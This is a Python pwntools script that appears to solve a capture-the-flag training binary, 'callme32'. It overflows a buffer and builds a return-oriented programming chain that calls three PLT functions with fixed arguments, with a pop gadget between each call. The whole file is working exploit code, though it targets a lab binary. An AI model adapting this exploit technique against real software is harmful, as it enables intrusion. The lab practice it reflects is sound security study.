from pwn import *

def main():
    elf = ELF("./callme32")
    
    args = p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)  # 適切な実引数
    gadget = p32(0x80487f9)

    # ROP Chain
    # for callme_one
    payload = b'A' * 44
    payload += p32(elf.plt["callme_one"])
    payload += gadget
    payload += args

    # for callme_two
    payload += p32(elf.plt["callme_two"])
    payload += gadget
    payload += args

    # for callme_three
    payload += p32(elf.plt["callme_three"])
    payload += gadget
    payload += args

    
    p = elf.process()
    p.recvuntil("> ")
    p.sendline(payload)
    p.interactive()
    
    print(payload)


if __name__ == "__main__":
    main()